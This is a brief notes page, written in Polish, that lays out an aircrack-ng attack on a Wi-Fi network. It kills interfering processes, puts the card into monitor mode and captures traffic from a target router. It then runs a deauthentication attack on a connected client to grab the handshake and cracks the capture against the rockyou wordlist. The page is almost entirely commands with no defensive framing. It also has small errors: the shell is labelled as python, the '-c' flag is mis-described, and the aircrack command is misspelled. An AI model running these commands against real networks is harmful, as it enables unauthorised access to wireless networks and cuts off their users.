---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# airodump + aireplay +aircrack

```python
#zabijanie sieci
sudo airmon-ng check kill

#włączanie karty w trybie monitor
sudo airmon-ng start wlan0

#włączanie airodump
airodump-ng wlan0

#atakujemy router/inne urządzenie bssid 1A:AA:E8:EF:20:DF na kanale 149
sudo airodump-ng wlan0 --bssid 1A:AA:E8:EF:20:DF -c 149 -w crack.txt-01.cap

#atak deuwierzytelniający - przejęcie hasła (-a bssid routera)(-c bssid klienta)
sudo aireplay-ng -0 150 -a 1A:AA:E8:EF:20:DF -c 4E:1A:B5:BF:5C:48 wlan0

#crackowanie przechwyconego pliku .cap
aircracng -w /usr/share/wordlists/rockyou.txt crack.txt-01.cap
```
